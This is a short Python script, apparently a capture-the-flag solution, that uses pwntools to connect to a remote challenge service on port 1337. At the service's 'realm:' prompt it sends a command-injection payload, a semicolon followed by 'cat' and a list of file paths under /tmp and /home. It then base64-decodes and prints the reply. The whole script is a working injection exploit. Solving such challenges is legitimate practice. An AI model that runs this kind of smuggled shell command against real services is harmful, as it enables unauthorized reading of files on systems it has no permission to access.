#!/usr/bin/env python3
from pwn import *
import base64

r = remote('loabshouse.niccgetsspooky.xyz', 1337)

locations = [
    b'/tmp/singularity',
    b'/tmp/abyss',
    b'/tmp/orphans',
    b'/home/council',
    b'/tmp/.boom',
    b'/home/victim/.consortium',
    b'/usr/bnc/.yummyarbs',
    b'/tmp/.loab',
    b'/tmp/loab',
]

payload = b'; cat '
payload += b' '.join(locations)

r.sendlineafter(b'realm: ', payload)
r.recvuntil(b'forever.\n')

print(base64.b64decode(r.recvline()).strip().decode())
